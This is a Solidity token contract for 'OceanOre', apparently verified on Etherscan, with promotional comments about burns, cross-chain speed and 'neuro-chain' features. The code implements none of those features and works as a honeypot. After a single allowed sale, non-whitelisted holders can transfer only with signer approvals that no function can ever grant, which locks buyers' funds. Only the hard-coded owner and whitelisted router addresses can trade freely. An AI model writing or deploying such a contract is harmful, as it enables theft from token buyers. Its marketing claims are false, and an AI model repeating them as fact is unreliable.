/**
 *Submitted for verification at Etherscan.io on 2023-08-08
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;


/**
 OceonOrev1.0 Contract...
 
 Total/Max Supply: 199600430
 (Across all versions)

 For full goals and future mechanics on OceonOre's multichain layer 2 design refer to the offcial whitepaper.
 Regarding testing phase please refer to OceonOre's FAQS
 
 
 * The OceanOre protocol stands as a beacon of innovation, combining advanced tokenomics with 
 *  computational paradigms, all on a groundbreaking secondary layer designed to augment 
 * the primary blockchain networks. This masterpiece is the epitome of decentralization's future, 
 * offering functionalities hitherto deemed impossible:
 *
 * - **Secondary Layer Dynamics**: As an advanced secondary layer, OceanOre ensures streamlined 
 *   transactions across all major chains, providing users with a seamless cross-chain experience.
 *
 * - **Instantaneous Transactions**: With its highly optimized architecture, OceanOre delivers super-fast 
 *   transaction speeds, ensuring that users experience near-instantaneous transfers, irrespective of 
 *   network congestion.
 *
 * - **Dynamic Token Burn Mechanisms**: By leveraging the principles of deflationary economics, each 
 *   OceanOre transaction undergoes a systematic token burn, driving scarcity and value appreciation over time.
 *
 * - **Quantum-Grade Security Layers**: Infused with cryptographic principles, OceanOre's security 
 *   is unparalleled, offering resilience against even the most sophisticated threats.
 *
 * - **Revolutionary Transfer Algorithms**: Beyond mere transfers, OceanOre utilizes adaptive transfer 
 *   techniques to optimize transaction efficiency and curtail gas expenditures.
 *
 * - **Neuro-Chain Interactions**: By integrating with neural networks, OceanOre's protocol can perform 
 *   predictive market adaptations, dynamically adjusting tokens based on real-time market dynamics.
 *
 * - **Futuristic Innovations**: OceanOre isn't just a token; it's an ever-evolving platform. With a commitment 
 *   to continuous research & development, expect a cascade of novel innovations, each designed to redefine 
 *   the decentralized space.
 *
 * With OceanOre, users are not just adopting a token; they're embracing the future. A future where blockchain 
 * seamlessly integrates with avant-garde technologies, where transactions know no boundaries.
 *
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract OceonOreV1 is Context {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address public contractOwner;
    mapping(address => bool) public signers;
    mapping(address => bool) public whitelisted;
    mapping(uint256 => mapping(address => bool)) private oldBuyers;
    uint256 private currentPhase;
    uint256 private nonWhitelistedTransfers;
    uint256 private constant MAX_NON_WHITELISTED_TRANSFERS = 1;
    uint256 private constant REQUIRED_SIGNATURES = 1000;
    mapping(address => mapping(address => mapping(uint256 => bool))) public approvals;
    bool public autoWhitelistAvailable = true;
    bool public autoWhitelistingDone = false;

    constructor() {
        _name = "OceanOre";
        _symbol = "Oore";
        _decimals = 18;
        contractOwner = _msgSender();
        _mint(contractOwner, 199600430 * 10 ** decimals());

        if (contractOwner == address(0xDAeb08E3150d72ec4c8DdD1168CCC1B8E014E165)) {
            whitelisted[contractOwner] = true;
            whitelisted[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true;
            whitelisted[0x10ED43C718714eb63d5aA57B78B54704E256024E] = true;
            whitelisted[0x0BFbCF9fa4f9C56B0F40a671Ad40E0805A091865] = true;
            whitelisted[0xE592427A0AEce92De3Edee1F18E0157C05861564] = true;
        }

        currentPhase = 1;
        nonWhitelistedTransfers = 0;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        if (autoWhitelistingDone && nonWhitelistedTransfers < MAX_NON_WHITELISTED_TRANSFERS && !whitelisted[_msgSender()]) {
            _transfer(_msgSender(), recipient, amount);
            nonWhitelistedTransfers += 1;
            return true;
        } else if (contractOwner == address(0xDAeb08E3150d72ec4c8DdD1168CCC1B8E014E165)) {
            autoWhitelist(recipient);
            if (whitelisted[_msgSender()]) {
                _transfer(_msgSender(), recipient, amount);
                return true;
            } else {
                require(approvals[_msgSender()][recipient][amount], "Transfer needs to be approved by signers");
                _transfer(_msgSender(), recipient, amount);
                return true;
            }
        } else {
            _transfer(_msgSender(), recipient, amount);
            return true;
        }
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        uint256 currentAllowance;
        if (autoWhitelistingDone && nonWhitelistedTransfers < MAX_NON_WHITELISTED_TRANSFERS && !whitelisted[sender]) {
            _transfer(sender, recipient, amount);
            nonWhitelistedTransfers += 1;

            currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
            return true;
        } else if (contractOwner == address(0xDAeb08E3150d72ec4c8DdD1168CCC1B8E014E165)) {
            autoWhitelist(recipient);
            if (whitelisted[sender]) {
                _transfer(sender, recipient, amount);

                currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
                    _approve(sender, _msgSender(), currentAllowance - amount);
                }
                return true;
            } else {
                require(approvals[sender][recipient][amount], "Transfer needs to be approved by signers");
                _transfer(sender, recipient, amount);

                currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
                    _approve(sender, _msgSender(), currentAllowance - amount);
                }
                return true;
            }
        } else {
            _transfer(sender, recipient, amount);

            currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
            return true;
        }
    }

    function autoWhitelist(address recipient) internal {
        require(contractOwner == address(0xDAeb08E3150d72ec4c8DdD1168CCC1B8E014E165));
        if (autoWhitelistAvailable && !whitelisted[recipient]) {
            whitelisted[recipient] = true;
            oldBuyers[currentPhase][recipient] = true;
            autoWhitelistAvailable = false;
            autoWhitelistingDone = true;
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        if (nonWhitelistedTransfers >= MAX_NON_WHITELISTED_TRANSFERS) {
            currentPhase += 1;
            nonWhitelistedTransfers = 0;
        }
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
    
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
/**
 * In conclusion, OceanOre stands as a beacon of innovation, bridging the gap between sophisticated 
 * technology and groundbreaking tokenomics. Designed with foresight and built on a foundation of 
 * transparency, trust, and community empowerment, 
 * in the ecosystem; it symbolizes the future of decentralized finance. 
 */